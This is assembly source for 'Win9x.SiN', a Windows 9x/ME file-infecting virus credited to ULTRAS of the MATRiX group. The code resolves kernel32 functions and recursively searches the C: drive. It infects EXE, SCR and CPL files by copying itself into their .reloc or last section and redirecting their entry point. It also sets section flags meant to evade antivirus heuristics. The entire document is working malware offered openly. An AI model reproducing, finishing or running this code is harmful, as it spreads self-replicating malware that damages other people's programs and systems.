   ;
   ; [ Win9x.SiN by ULTRAS / MATRiX ]
   ;
   ;
   ; The simple virus which infects PE files (EXE/CPL/SCR).
   ; Overwrites .reloc sections renames .reloc to .ultras
   ; Virus not finished (im really lazy)
   ;
   ; Greatz: MATRiX TeAm & IkX teAM

           .486p
           .model flat,stdcall

   extrn       MessageBoxA:proc
   extrn       ExitProcess:proc

           .data
   _title          db      "[Win9x.SiN."
                   db      virus_size/01000 mod 10 + "0"
                   db      virus_size/00100 mod 10 + "0"
                   db      virus_size/00010 mod 10 + "0"
                   db      virus_size/00001 mod 10 + "0"
                   db      "]",0
   _message        db      "First generation host",10
                   db      "(c) 2000 [ULTRAS/MATRiX]",0

           .code

   start:      push    0
           push    offset _title
           push    offset _message
           push    0
           call    MessageBoxA
           push    0
           call    ExitProcess

   fexe            db "1*.EXE",0

   header_s equ 60h
   obj_size equ 28h
   dta_size equ 22ch

   vstart:     db 68h
   ext     dd offset start


      call delta
   delta:
      mov ebp,[esp]
      sub ebp,offset delta
      add esp,4

    ; Windoze 95/98?

      mov eax,0bff70000h
      cmp word ptr [eax],"ZM"
      je good_os

    ; Windoze ME?

      mov eax,0bff60000h
      cmp word ptr [eax],"ZM"
      jne @exitz

   good_os:
      mov [ebp+kernel], eax    ; save kernel adress
      mov esi,eax
      add esi,[esi+3ch]
      cmp word ptr [esi], "EP" ; is it a PE?
      jne @exitz
      mov esi,[esi+120]
      add esi,eax
      mov edi,[esi+36]
      add edi,eax
      mov [ebp+ordin_tab],edi
      mov edi,[esi+32]
      add edi,eax
      mov [ebp+name_tab],edi
      mov ecx,[esi+24]
      mov esi,[esi+28]
      add esi,eax
      mov [ebp+adrtbl],esi
      xor edx,edx
      lea esi,[ebp+apiz]
      mov [ebp+o_api],esi
      lea eax,[ebp+win32apiz]
      mov [ebp+cur_api], eax

   nextz_api:
      mov esi,[ebp+o_api]
      mov ebx,[esi]
      add ebx,ebp
      mov esi,[edi]
      add esi,[ebp+kernel]

   cmp_apiz:
      lodsb
      cmp al,[ebx]
      jnz not_our_API
      cmp al,0
      jz is_our_API
      inc ebx
      jmp cmp_apiz

   not_our_API:
      inc edx
      cmp edx,ecx
      jz @exitz
      add edi,4
      mov esi,[ebp+o_api]
      jmp nextz_api

   is_our_API:
      mov edi,[ebp+ordin_tab]
      push ecx
      push edx
      xchg edx,eax
      add eax,eax
      add edi,eax
      mov ax,[edi]
      xor edx, edx
      mov ecx,4
      mul ecx
      mov edi,[ebp+adrtbl]
      add edi,eax
      mov eax,edi
      sub eax,[ebp+kernel]
      mov [ebp+org_rva],eax
      mov eax,[edi]
      mov [ebp+org_rva_],eax
      add eax,[ebp+kernel]
      mov edi,[ebp+cur_api]
      mov [edi],eax
      add edi,4
      mov [ebp+cur_api],edi
      pop edx
      pop ecx
      mov edi,[ebp+name_tab]
      mov esi,[ebp+o_api]
      add esi,4
      mov [ebp+o_api],esi
      cmp [esi],dword ptr 0
      jz found_all
      mov edi,[ebp+name_tab]
      xor edx,edx
      jmp nextz_api
      call  found_all
   @exitz:
       ret


   found_all:
      pusha
      sub esp,size win32fd_struc ; find data structure
      mov edi,esp
      push '\:C'
      mov edx, esp
      call @fuckdirz
      add esp, 4+size win32fd_struc
      popa
      retn

   @fuckdirz:
      pusha
      sub esp,1024

      mov esi,edx        ; in EDX name dirz
      mov edi,esp        ; The bufferz under a complete name

   @copy:
      lodsb              ; copy namez in vir bufferz
      stosb
      or al,al
      jnz @copy
      dec edi            ; dirz should come to an end on '\'
      mov al,'\'
      cmp [edi-1],al
      je @next           ; next testing
      stosb

   @next:
      mov ebx,edi        ; EBX = the index on a file
      mov eax, '*.*'     ; seàrch dirz\*.* all filez
      stosd

      mov edi,[esp+1024] ; restore EDI
      mov eax, esp
      push edi           ; find data structure
      push eax           ; name target

      call [ebp+_FindFirstFileA]

      xchg esi,eax        ; ESI = search handle

      cmp esi,-1          ; not foundz!.!
      je @exit            ; quit

   @bolee:
      pusha               ; add a name of file to dirz
      lea esi,[edi].filename
      mov edi,ebx

   @korect:
      lodsb
      stosb
      or al,al
      jnz @korect
      popa

      mov edx,esp          ; EDX = full found name
      test byte ptr [edi].fileattributes, 16  ; directory
      jnz @dirz

      call teztfile        ; viva loca !!!

      jmp @fnext           ; find next

   @dirz:
      lea eax,[edi].filename
      cmp byte ptr [eax],'.'    ; skip ./../etc.
      je @fnext

      call @fuckdirz        ; fucka dira

   @fnext:
      push edi             ; find data structure
      push esi             ; search handle
      call [ebp+_FindNextFileA]

      or eax,eax           ; have file?
      jnz @bolee

      push esi             ; search handle
      call [ebp+_FindClose] ; close search

   @exit:          ; exit from procedure
      add esp, 1024
      popa
      retn


   teztfile:
      pusha
      mov esi,edx
   @scanz:
      lodsb
      or al,al
      jne @scanz
      mov eax, [esi-5]
      or eax,20202000h

      ; let's check up expansion of a file

      ;cmp eax, 'xtm.' ; MTX! (degug version)
      ;je @infect

      cmp eax,'exe.'   ; EXE
      je @infect

      cmp eax,'rcs.'   ; SCR?
      je @infect

      cmp eax,'lpc.'   ; CPL?
      je @infect


      popa
      retn

   @infect:
      call Infect       ; start fucking filez
      popa
      retn

   virname db 'SiN by ULTRAS [MATRiX]', 0
           db 'thnx Vendigo',0


   Infect:
      xor eax,eax
      push eax         ; parameters at opening
      push eax
      push 03h
      push eax
      inc eax
      push eax
      push 0c0000000h      ; Attributes R/W
      ;lea edi,[dta_+2ch+ebp]  ; filehandle
      push edx
      call [ebp+_CreateFileA]  ; save handle of opened file
      inc eax
      jz Exit
      dec eax
      mov fhandle,eax      ; save handle
      push eax
      push 00h
      push eax
      call [ebp+_GetFileSize]  ; get file size
      pop ecx
      add eax,all_size
      push eax
      xor ebx,ebx
      push ebx
      push eax         ; file size
      push ebx
      push 04h
      push ebx
      push ecx         ; file handle
      call [ebp+_CreateFileMappingA]
      pop ecx          ; size to map
      test eax,eax         ; error?
      jz clsfh         ; close & exit
      mov mhandle,eax      ; save maphandle
      xor ebx,ebx
      push ecx         ; size
      push ebx
      push ebx
      push 02h
      push eax
      call [ebp+_MapViewOfFile]
      test eax,eax         ; eror?
      jz unmap         ; close & exit
      mov mapadres,eax     ; save mapaddress
      mov esi,[eax+3ch]
      add esi,eax
      cmp word ptr [esi],"EP"  ; this is PE file?
      jnz unmap
      cmp [esi+4ch],'nNiS'     ; file infected?
      jz unmap
      mov [esi+4ch],'nNiS'     ; save mark of infection
      mov edi,esi

      mov eax, [esi+52]        ; ***
      mov [ebp+pe_imagebase], eax  ; ***
      mov eax, [esi+40]        ; ***
      mov [ebp+pe_entryrva], eax   ; ***

      movzx eax,word ptr [edi+06h]
      dec eax
      imul eax,eax,28h
      add esi,eax
      add esi,78h
      mov edx,[edi+74h]
      shl edx,03h
      add esi,edx          ; edi = PE header

      ; so it will be found out by antiviruses
      ; or [esi+24h],0a0000020h

      ; and so is not present... simple antiheuristic
      mov [esi+36],80000000h OR 40000000h ; new section attributes

      mov eax,[ebp+pe_entryrva]         ; ***
      add eax,[ebp+pe_imagebase]        ; ***
      mov ext, eax                      ; ***

      ; check it reloc section

      and dword ptr [edi+0a0h],00h
      and dword ptr [edi+0a4h],00h
      cmp dword ptr [esi],"ler."
      jnz next_                 ; .reloc
      cmp dword ptr [esi+4],"co"
      jnz next_

      ; yeah. overwrite reloc section!!!

      mov dword ptr [esi],"tlu."      ; set new name .ultras
      mov dword ptr [esi+4],"sar"
      and dword ptr [esi+18h],00h     ; remove PointerToRelocations
      and word ptr [esi+20h],00h      ; remove NumberOfRelocations
      push dword ptr [esi+14h]        ; where copy virus
      mov eax,virus_size
      mov [esi+08h],eax
      mov ecx,[edi+3ch]           ; ecx = alignment
      cdq
      push eax
      div ecx
      pop eax
      sub ecx,edx
      add eax,ecx
      mov [esi+10h],eax
      mov eax,[esi+0ch]
      xchg eax,[edi+28h]

      pushad
      mov eax,[esi+14h]
      add eax,[esi+10h]
      mov ecx,[edi+3ch]
      cdq
      push eax
      div ecx
      pop eax
      sub ecx,edx
      add eax,ecx
      mov [esp+14h],eax
      popad
      pop edi
      add edi,dword ptr [ebp+mapadres]
      lea esi,vstart
      mov ecx,virus_size
      rep movsb
      jmp shiteof

      next_:
      mov edx,[esi+10h]
      mov ebx,edx
      add edx,[esi+14h]
      push edx
      mov eax,ebx
      add eax,[esi+0ch]
      xchg [edi+28h],eax
      mov eax,[esi+10h]
      add eax,virus_size
      mov ecx,[edi+3ch]
      cdq
      push eax
      div ecx
      pop eax
      sub ecx,edx
      add eax,ecx
      mov [esi+10h],eax
      mov [esi+08h],eax
      xchg eax,edx
      mov eax,[esi+10h]
      add eax,[esi+0Ch]
      mov [edi+50h],eax
      add edx,[esi+14h]
      pop edi
      lea esi,vstart
      add edi,dword ptr [ebp+mapadres]
      mov ecx,virus_size
      rep movsb

      shiteof:
      xor eax,eax
      push eax
      push eax
      push edx
      push dword ptr [ebp+fhandle]
      call [ebp+_SetFilePointer]
      push dword ptr [ebp+fhandle]
      call [ebp+_SetEndOfFile]

      unmap:
      push dword ptr [ebp+mapadres]
      call [ebp+_UnmapViewOfFile]

      clsmh:
      push dword ptr [ebp+mhandle]
      call [ebp+_CloseHandle]

      clsfh:   ; çàêðîåì ôàéë êîòîðûé ìû îòêðûâàëè
      push dword ptr [ebp+fhandle]
      call [ebp+_CloseHandle]

      Exit:
      ret

   fhandle   dd      00000000h
   mapadres  dd      00000000h
   mhandle   dd      00000000h

   win32fd_struc                struc                   ; win32 "searchrec" structure
   fileattributes               dd      ?
   creationtime                 dd      ?,?
   lastaccesstime               dd      ?,?
   lastwritetime                dd      ?,?
   filesizehigh                 dd      ?
   filesizelow                  dd      ?
   reserved                     dd      ?,?
   filename                     db      260 dup (?)
   alternatefilename            db      14 dup (?)
                                ends


   all_size equ     virus_size+over

   apiz: dd offset @1
         dd offset @2
         dd offset @3
         dd offset @4
         dd offset @5
         dd offset @6
         dd offset @7
         dd offset @8
         dd offset @9
         dd offset @10
         dd offset @11
         dd offset @12
         dd offset @13
         dd offset @14
         dd offset @15
         dd offset @16
         dd 0

   @1    db 'CreateFileA',0
   @2    db 'SetFilePointer',0
   @3    db 'CloseHandle',0
   @4    db 'FindFirstFileA',0
   @5    db 'FindNextFileA',0
   @6    db 'FindClose',0
   @7    db 'MapViewOfFile',0
   @8    db 'GetFileSize',0
   @9    db 'CreateFileMappingA',0
   @10   db 'SetEndOfFile',0
   @11   db 'UnmapViewOfFile',0
   @12   db 'ExitProcess',0
   @13   db 'lstrcat',0
   @14   db 'GetWindowsDirectoryA',0
   @15   db 'WriteFile',0
   @16   db 'SetCurrentDirectoryA',0

   win32apiz:
   _CreateFileA        dd  0
   _SetFilePointer     dd  0
   _CloseHandle        dd  0
   _FindFirstFileA     dd  0
   _FindNextFileA      dd  0
   _FindClose      dd  0
   _MapViewOfFile      dd  0
   _GetFileSize        dd  0
   _CreateFileMappingA dd  0
   _SetEndOfFile       dd  0
   _UnmapViewOfFile    dd  0
   _ExitProcess        dd  0
   _lstrcat        dd  0
   _GetWindowsDirectoryA   dd  0
   _WriteFile      dd  0
   _SetCurrentDirectoryA   dd  0

   over        equ     virus_end-over_shit
   virus_size      equ     $-vstart
   over_shit:

   name_tab    dd  ?
   adrtbl      dd  ?
   o_api           dd  ?
   cur_api         dd  ?
   ordin_tab   dd  ?
   org_rva         dd  ?
   org_rva_        dd  ?
   kernel          dd  ?
   header_o    dd  ?
   objectOfs   dd  ?

   pe_imagebase    dd  ?           ; ***
   pe_entryrva dd  ?           ; ***

   SearchHandle    dd  ?
   bytez       dd  ?
   object      dd  obj_size/4 dup (?)
   headerz     dd  header_s/4 dup (?)
   dta_        dd  dta_size/4 dup (?)
   virus_end:
           end vstart
